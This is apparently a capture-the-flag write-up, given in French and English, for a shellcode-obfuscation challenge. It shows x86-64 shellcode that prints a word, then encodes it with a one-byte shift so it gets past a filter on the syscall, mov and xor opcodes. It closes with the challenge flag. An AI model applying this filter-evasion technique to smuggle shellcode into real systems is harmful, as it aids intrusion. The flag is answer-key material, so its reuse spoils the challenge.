# Shellcode Obfuscation 2
## Write-up
### Solution (Français)
Les bytes interdits sont \x05\x0F\x89\x31

Si on prends le shellcode pour print "Manèges":
`\x6a\x0b\xfe\x0c\x24\x48\xb8\x4d\x61\x6e\xc3\xa8\x67\x65\x73\x50\x6a\x01\x5f\x6a\x10\x5a\x48\x89\xe6\x6a\x01\x58\x0f\x05`

On remarque que nos bytes interdits sont présents, ce qui est normal car il s'agit des bytes pour le syscall(\x05\x0F), mov(\x89) et xor(\x31). 

Cette fois on peut modifier les bytes passés avec une compréhension de liste.

Si on fait un rot1 sur nos bytes on obtient:
`\x6b\x0c\xff\x0d\x25\x49\xb9\x4e\x62\x6f\xc4\xa9\x68\x66\x74\x51\x6b\x02\x60\x6b\x11\x5b\x49\x8a\xe7\x6b\x02\x59\x10\x06`

On peut ensuite passer l'opération `int(x) - 1` pour récupérer notre shellcode executable.

En executant avec nos bytes en rot1 et notre opération on obtient le flag.

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`

### Solution (English)
Forbidden bytes are \x05\x0F\x89\x31

If we take the shellcode to print "Manèges":
`\x6a\x0b\xfe\x0c\x24\x48\xb8\x4d\x61\x6e\xc3\xa8\x67\x65\x73\x50\x6a\x01\x5f\x6a\x10\x5a\x48\x89\xe6\x6a\x01\x58\x0f\x05`

We notice that our forbidden bytes are present, which is normal as they are the bytes for syscall(\x05\x0F), mov(\x89) and xor(\x31). 

This time we can modify the bytes passed with a list comprehension.

If we rot1 our bytes, we get:
`\x6b\x0c\xff\x0d\x25\x49\xb9\x4e\x62\x6f\xc4\xa9\x68\x66\x74\x51\x6b\x02\x60\x6b\x11\x5b\x49\x8a\xe7\x6b\x02\x59\x10\x06`

We can then pass the `int(x) - 1` operation to retrieve our executable shellcode.

By executing with our bytes in rot1 and our operation, we obtain the flag.

Flag: `flag-ML5V9JD3K8WTYQZA7R6YA2C3DZ8V7T1B`